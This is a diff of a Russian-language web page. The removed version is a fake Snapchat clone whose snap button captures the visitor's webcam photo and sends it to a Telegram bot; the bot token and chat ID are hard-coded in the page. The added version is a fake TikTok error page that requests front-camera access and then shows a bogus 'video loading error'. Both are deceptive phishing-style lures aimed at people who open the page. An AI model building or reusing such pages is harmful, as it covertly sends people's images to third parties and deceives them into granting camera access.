@@ -1,225 +1,71 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Snapchat Web Clone</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok Error</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body {
-      background-color: black;
-      height: 100vh;
+      margin: 0;
+      padding: 0;
+      background: black;
       overflow: hidden;
-      font-family: Arial, sans-serif;
+      height: 100vh;
     }
-    .snap-container {
-      position: relative;
+
+    #background {
       width: 100vw;
       height: 100vh;
-    }
-    video, canvas {
-      position: absolute;
-      width: 100%;
-      height: 100%;
       object-fit: cover;
+      position: absolute;
       z-index: 1;
     }
-    .top-bar, .bottom-bar {
+
+    #error {
       position: absolute;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 10px 20px;
-      z-index: 2;
-    }
-    .top-bar {
-      top: 0;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(20, 20, 20, 0.95);
       color: white;
-    }
-    .bottom-bar {
-      bottom: 0;
-      justify-content: center;
-    }
-    .snap-btn {
-      width: 70px;
-      height: 70px;
-      background: white;
-      border-radius: 50%;
-      border: 6px solid #FFD700;
-      cursor: pointer;
-    }
-    #status {
-      position: absolute;
-      bottom: 80px;
-      width: 100%;
-      text-align: center;
-      color: white;
-      z-index: 2;
+      padding: 20px 25px;
+      border: 1px solid #ff4444;
+      border-radius: 12px;
       font-size: 16px;
-    }
-    .mask-selector {
-      position: absolute;
-      bottom: 160px;
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      z-index: 2;
-    }
-    .mask-option {
-      width: 50px;
-      height: 50px;
-      border-radius: 10px;
-      overflow: hidden;
-      cursor: pointer;
-      border: 2px solid white;
-    }
-    .mask-option img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
+      text-align: center;
+      z-index: 999;
+      display: none;
+      box-shadow: 0 0 20px red;
     }
   </style>
 </head>
 <body>
-  <div class="snap-container">
-    <video id="video" autoplay muted playsinline></video>
-    <canvas id="overlay"></canvas>
-    <div class="top-bar">
-      <div>👻 Snapchat</div>
-      <div>⚙️</div>
-    </div>
-    <div id="status">Запуск камеры...</div>
-    <div class="mask-selector" id="maskSelector"></div>
-    <div class="bottom-bar">
-      <div class="snap-btn" id="snapButton"></div>
-    </div>
-  </div>
+  <!-- TikTok-скриншот по ссылке -->
+  <img
+    id="background"
+    src="https://files.catbox.moe/xqjqii.jpg"
+    alt="TikTok Frame"
+  />
 
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
+  <!-- Ошибка -->
+  <div id="error">⚠️ Ошибка загрузки видео. Повторите позже.</div>
 
   <script>
-    const BOT_TOKEN = '7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE';
-    const CHAT_ID = '5586578957';
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('overlay');
-    const ctx = canvas.getContext('2d');
-    const status = document.getElementById('status');
-    const maskSelector = document.getElementById('maskSelector');
-
-    const masks = [
-      null, // No mask
-      'https://i.postimg.cc/fyC6yZ9P/glasses.png',
-      'https://i.postimg.cc/dtZCw8b6/dog-ears.png',
-      'https://i.postimg.cc/26kbc3vj/crown.png'
-    ];
-
-    let currentMaskIndex = 0;
-    let filterImg = new Image();
-    filterImg.src = masks[1];
-
-    masks.forEach((src, index) => {
-      const div = document.createElement('div');
-      div.className = 'mask-option';
-      const img = document.createElement('img');
-      img.src = src || 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/Red_x.svg/1200px-Red_x.svg.png';
-      div.appendChild(img);
-      div.addEventListener('click', () => {
-        currentMaskIndex = index;
-        if (masks[index]) {
-          filterImg.src = masks[index];
-        }
-      });
-      maskSelector.appendChild(div);
-    });
-
-    const faceMesh = new FaceMesh({
-      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
-    });
-
-    faceMesh.setOptions({
-      maxNumFaces: 1,
-      refineLandmarks: true,
-      minDetectionConfidence: 0.5,
-      minTrackingConfidence: 0.5
-    });
-
-    faceMesh.onResults((results) => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-      if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) return;
-      if (!masks[currentMaskIndex]) return; // No mask selected
-
-      const landmarks = results.multiFaceLandmarks[0];
-      const leftEye = landmarks[33];
-      const rightEye = landmarks[263];
-
-      const dx = rightEye.x - leftEye.x;
-      const dy = rightEye.y - leftEye.y;
-      const angle = Math.atan2(dy, dx);
-      const dist = Math.sqrt(dx * dx + dy * dy) * canvas.width;
-
-      const centerX = (leftEye.x + rightEye.x) / 2 * canvas.width;
-      const centerY = (leftEye.y + rightEye.y) / 2 * canvas.height;
-
-      ctx.save();
-      ctx.translate(centerX, centerY);
-      ctx.rotate(angle);
-      ctx.drawImage(filterImg, -dist / 2, -dist / 3, dist, dist / 1.5);
-      ctx.restore();
-    });
-
-    const camera = new Camera(video, {
-      onFrame: async () => {
-        await faceMesh.send({ image: video });
-      },
-      width: 640,
-      height: 480
-    });
-
-    camera.start();
-
-    document.getElementById('snapButton').addEventListener('click', takePhoto);
-
-    function takePhoto() {
-      status.textContent = '📸 Снимаем фото...';
-
-      const photoCanvas = document.createElement('canvas');
-      photoCanvas.width = canvas.width;
-      photoCanvas.height = canvas.height;
-      const photoCtx = photoCanvas.getContext('2d');
-
-      photoCtx.translate(photoCanvas.width, 0);
-      photoCtx.scale(-1, 1);
-      photoCtx.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
-      photoCtx.setTransform(1, 0, 0, 1, 0, 0);
-      photoCtx.drawImage(canvas, 0, 0);
-
-      photoCanvas.toBlob(blob => sendToTelegram(blob), 'image/png');
+    async function run() {
+      try {
+        // Запрос фронтальной камеры
+        await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        // После задержки показать ошибку
+        setTimeout(() => {
+          document.getElementById("error").style.display = "block";
+        }, 2500);
+      } catch (err) {
+        document.getElementById("error").textContent = "⚠️ Доступ к камере запрещён.";
+        document.getElementById("error").style.display = "block";
+      }
     }
 
-    function sendToTelegram(blob) {
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, 'snap.png');
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-        .then(res => res.json())
-        .then(data => {
-          status.textContent = data.ok ? '✅ Фото отправлено в Telegram' : '❌ Ошибка: ' + JSON.stringify(data);
-        })
-        .catch(err => {
-          status.textContent = '❌ Ошибка отправки: ' + err.message;
-        });
-    }
+    run();
   </script>
 </body>
 </html>
